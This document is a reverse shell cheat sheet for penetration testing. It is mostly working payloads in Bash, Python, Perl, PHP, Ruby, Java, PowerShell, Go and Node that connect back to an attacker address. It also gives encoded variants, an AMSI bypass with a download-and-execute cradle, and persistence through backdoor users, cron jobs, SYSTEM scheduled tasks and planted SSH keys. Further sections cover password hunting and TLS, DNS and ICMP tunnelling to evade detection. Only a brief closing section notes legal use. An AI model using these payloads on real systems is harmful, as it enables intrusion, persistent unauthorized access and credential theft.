# Comprehensive Reverse Shell Cheat Sheet

## Introduction

A reverse shell is a type of shell in which the target machine initiates a connection back to the attacker's machine. This technique is particularly useful when the target is behind a firewall or NAT that would block incoming connections. This cheat sheet provides a comprehensive guide to establishing and maintaining reverse shells using various tools and techniques.

## Table of Contents

1. [Reverse Shell Generators](#reverse-shell-generators)
2. [Basic Listeners](#basic-listeners)
   - [Netcat](#netcat)
   - [Rlwrap](#rlwrap)
   - [Rustcat](#rustcat)
   - [Socat](#socat)
3. [Advanced Listeners](#advanced-listeners)
   - [Pwncat](#pwncat)
   - [Metasploit](#metasploit)
4. [Windows-Specific Techniques](#windows-specific-techniques)
   - [ConPty Shell](#conpty-shell)
   - [PowerShell Reverse Shells](#powershell-reverse-shells)
5. [Reverse Shell Payloads](#reverse-shell-payloads)
   - [Bash](#bash)
   - [Python](#python)
   - [Perl](#perl)
   - [PHP](#php)
   - [Ruby](#ruby)
   - [Java](#java)
   - [PowerShell](#powershell)
   - [Other Languages](#other-languages)
6. [Post-Exploitation](#post-exploitation)
   - [Shell Stabilization](#shell-stabilization)
   - [Privilege Escalation](#privilege-escalation)
   - [Persistence](#persistence)
7. [Evasion Techniques](#evasion-techniques)
   - [Port Selection](#port-selection)
   - [Encryption](#encryption)
   - [Traffic Obfuscation](#traffic-obfuscation)
8. [Security Considerations](#security-considerations)

## Reverse Shell Generators

Online and offline tools to quickly generate reverse shell commands:

- **[Revshells.com](https://www.revshells.com/)**: Offers a wide range of reverse shell commands and listeners for various operating systems and scenarios.
- **[Reverse Shell Generator (GTFOBins)](https://gtfobins.github.io/)**: Provides reverse shell techniques for binaries that have been misconfigured and can be abused.
- **[PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**: Classic resource with various reverse shell one-liners.
- **Metasploit**: `msfvenom` can generate sophisticated reverse shell payloads.

```bash
# Generating a reverse shell payload with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f elf > reverse-shell.elf
```

## Basic Listeners

### Netcat

Often described as the "Swiss Army knife of networking," Netcat provides basic connectivity for reverse shells.

**Installation:**
```bash
# On Debian-based systems
apt install netcat-traditional
# Or
apt install netcat-openbsd
```

**Starting a listener:**
```bash
# Basic listener on port 4444
nc -lvnp 4444

# Variants:
# -l: Listen mode
# -v: Verbose output
# -n: Skip DNS lookup
# -p: Specify port
```

**Limitations:**
- No command history
- No tab completion
- Limited interactivity with certain commands
- No built-in encryption

### Rlwrap

Rlwrap (Readline Wrapper) enhances command-line interfaces by adding command history and tab completion capabilities.

**Installation:**
```bash
apt install rlwrap
```

**Starting a listener with rlwrap:**
```bash
rlwrap nc -lvnp 4444
```

**Advantages over Netcat:**
- Command history (up/down arrow keys)
- Command editing
- Tab completion for commands

### Rustcat

A modern reimplementation of Netcat in Rust with improved features and performance.

**Installation:**
```bash
# Using cargo
apt install cargo
cargo install rustcat

# Add to PATH
echo 'export PATH=$PATH:$HOME/.cargo/bin' >> ~/.bashrc
# Or for ZSH
echo 'export PATH=$PATH:$HOME/.cargo/bin' >> ~/.zshrc
source ~/.bashrc  # or ~/.zshrc
```

**Starting a listener with Rustcat:**
```bash
# Basic interactive listener with banner
rcat listen -ib 1234

# UDP listener
rcat listen -u 1234

# Listener with history function
rcat listen -H 1234
```

**Advantages:**
- Memory safety (Rust-based)
- Tab completion
- Command history
- UDP support
- Color-coded output
- Concurrent connections

### Socat

Socat is a versatile relay tool that can create more sophisticated connections than Netcat.

**Installation:**
```bash
apt install socat
```

**Starting a listener with Socat:**
```bash
# Basic TCP listener
socat TCP-LISTEN:4444,fork STDOUT

# Create a full TTY-enabled listener
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

**Advantages:**
- Supports multiple protocols
- Can create encrypted connections
- Better handling of TTY interfaces
- Can chain connections

## Advanced Listeners

### Pwncat

A feature-rich netcat-like tool designed specifically for pentesters and red teamers.

**Installation:**
```bash
pip install pwncat-cs  # Current maintained version
```

**Starting a listener with Pwncat:**
```bash
# Basic listener
pwncat -l 1234

# Listener with persistence (self-inject)
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234

# Multi-port persistence (+2 means also create persistence on ports 1235 and 1236)
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234+2
```

**Advantages:**
- Interactive shell with syntax highlighting
- Command completion
- Scriptable interface (Python)
- Persistence capabilities
- Automatic enumeration
- File management utilities
- Privilege escalation helpers

### Metasploit

The Metasploit Framework provides robust capabilities for handling reverse shells.

**Starting a listener with Metasploit:**
```bash
# Start msfconsole
msfconsole

# Set up a multi/handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # Or another appropriate payload
set LHOST 192.168.1.7
set LPORT 4444
run
```

**Advantages:**
- Sophisticated session handling
- Built-in post-exploitation modules
- Multiple payload options
- Session migration
- Encrypted communications
- Advanced evasion techniques

## Windows-Specific Techniques

### ConPty Shell

Windows Console Pseudo Terminal (ConPty) provides a more interactive and stable shell experience on modern Windows systems.

**Setting up a ConPty listener (Kali):**
```bash
# Using stty to configure the terminal
stty raw -echo; (stty size; cat) | nc -lvnp 443
```

**ConPty reverse shell command (Windows):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.7',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Advantages:**
- Fully interactive session
- Proper handling of command-line utilities
- Stability on modern Windows systems
- Better evasion capabilities

### PowerShell Reverse Shells

PowerShell provides powerful options for creating reverse shells on Windows systems.

**Basic PowerShell reverse shell:**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.7",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Encoded PowerShell reverse shell (for bypassing command length restrictions):**
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

**Using PowerShell with HTTPS for evasion:**
```powershell
# First set up an HTTPS listener with a self-signed certificate
# On attacker machine:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# On Windows target:
$socket = New-Object Net.Sockets.TcpClient('192.168.1.7', 443)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain')
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $sslStream.Write($sendbyte,0,$sendbyte.Length)
    $sslStream.Flush()
}
```

## Reverse Shell Payloads

### Bash

```bash
# Basic bash reverse shell
bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'

# URL-encoded version (for web exploits)
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.7%2F4444%200%3E%261%27

# Base64 encoded (for bypass)
echo "bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'" | base64
bash -c '{echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNy80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}'

# Alternative if /dev/tcp is not available
rm -f /tmp/p; mknod /tmp/p p && /bin/sh 0</tmp/p | nc 192.168.1.7 4444 1>/tmp/p
```

### Python

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# With pty (more stable)
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Perl

```perl
perl -e 'use Socket;$i="192.168.1.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows version
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.1.7:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP

```php
// Method 1: Using system
php -r '$sock=fsockopen("192.168.1.7",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

// Method 2: Using proc_open
php -r '$sock=fsockopen("192.168.1.7",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

// Method 3: Using shell_exec (web context)
<?php
    $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'";
    shell_exec($cmd);
?>
```

### Ruby

```ruby
# Method 1
ruby -rsocket -e'f=TCPSocket.open("192.168.1.7",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Method 2 (with explicit /bin/sh)
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.7","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Java

```java
// Compile and run
public class Reverse {
    public static void main(String[] args) {
        try {
            String host = "192.168.1.7";
            int port = 4444;
            String cmd = "/bin/bash";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            java.net.Socket s = new java.net.Socket(host, port);
            java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}

// One-liner version (requires encoded command)
java -jar /path/to/revshell.jar
```

### PowerShell

```powershell
# Basic reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.7",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Using IEX (Invoke-Expression) with download cradle
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.7/reverse-shell.ps1')"

# Using reflection to bypass AMSI
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString('http://192.168.1.7/reverse-shell.ps1')"
```

### Other Languages

**Golang:**
```go
package main
import (
    "net"
    "os/exec"
    "time"
)

func main() {
    c, _ := net.Dial("tcp", "192.168.1.7:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
    time.Sleep(time.Second * 60)
}
```

**NodeJS:**
```javascript
// Run with: node revshell.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.1.7", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

## Post-Exploitation

### Shell Stabilization

Once a reverse shell is established, these techniques can improve its stability and usability:

**Python PTY method:**
```bash
# On target
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On attacker machine
stty raw -echo
fg
# Press Enter
# On target
export TERM=xterm
```

**Using script utility:**
```bash
script /dev/null -c bash
# Then follow the Python PTY method steps
```

**Using socat for a full TTY:**
```bash
# On attacker (set up a proper PTY listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.7:4444
```

### Privilege Escalation

Common techniques to escalate privileges after establishing a reverse shell:

**Basic enumeration:**
```bash
# User information
id
whoami
sudo -l

# System information
uname -a
cat /etc/issue
cat /etc/*-release

# Process information
ps aux
```

**Check for SUID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Check for writable files:**
```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

**Password hunting:**
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "PASSWORD" /etc/ 2>/dev/null
grep -r "secret" /etc/ 2>/dev/null
grep -r "key" /etc/ 2>/dev/null
```

### Persistence

Methods to maintain access to the target system:

**Using Pwncat:**
```bash
# Start Pwncat with persistence on multiple ports
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234+2
```

**Creating a backdoor user:**
```bash
# Linux
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:password123' | chpasswd

# Windows
net user backdoor password123 /add
net localgroup Administrators backdoor /add
```

**Using cron jobs (Linux):**
```bash
# Create a persistent reverse shell every 10 minutes
echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'" > /tmp/cron
crontab /tmp/cron
rm /tmp/cron
```

**Using scheduled tasks (Windows):**
```powershell
# Create a scheduled task that runs every hour
schtasks /create /sc hourly /tn "SystemCheck" /tr "powershell -c 'iex(New-Object Net.WebClient).DownloadString(\"http://192.168.1.7/reverse.ps1\")'" /ru SYSTEM
```

**Using SSH keys:**
```bash
# Generate SSH keys on attacker machine
ssh-keygen -t rsa

# Add public key to target's authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

## Evasion Techniques

### Port Selection

Choose ports that are commonly allowed through firewalls:

- **80/443**: HTTP/HTTPS
- **53**: DNS
- **123**: NTP
- **22**: SSH
- **25**: SMTP
- **389**: LDAP
- **3389**: RDP

### Encryption

Encrypt your reverse shell traffic to avoid detection:

**Using OpenSSL:**
```bash
# Attacker (listener)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# Target
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.7:443 > /tmp/s; rm /tmp/s
```

**Using SSH tunneling:**
```bash
# Create a reverse SSH tunnel
ssh -R 4444:localhost:22 user@192.168.1.7

# On attacker, connect to the local port
ssh -p 4444 targetuser@localhost
```

### Traffic Obfuscation

Techniques to make reverse shell traffic less detectable:

**Using DNS tunneling:**
```bash
# Install iodine on both machines
# On attacker (DNS server)
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# On target
iodine -f -P password tunnel.yourdomain.com

# Then establish an SSH connection through the tunnel
ssh user@10.0.0.1
```

**Using ICMP tunneling:**
```bash
# On attacker
ptunnel -p 192.168.1.7 -lp 8000 -da 10.0.0.1 -dp 22

# On target
ptunnel -p 192.168.1.7 -lp 2222 -da 10.0.0.1 -dp 22

# Then connect via SSH to the local port
ssh -p 2222 user@localhost
```

## Security Considerations

- **Always use reverse shells in a legal and authorized context** like penetration testing or security assessments.
- **Document all actions** taken during security assessments.
- **Clean up after testing** by removing any backdoors, temporary files, or created accounts.
- **Consider data privacy** implications when establishing reverse shells.
- **Use encryption** when possible to protect sensitive data.
- **Be aware of legal implications** - unauthorized access is illegal in most jurisdictions.

## Additional Resources

- [PayloadsAllTheThings - Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HackTricks - Reverse Shell Guide](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
- [OWASP - Reverse Shell Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_Command_Injection)
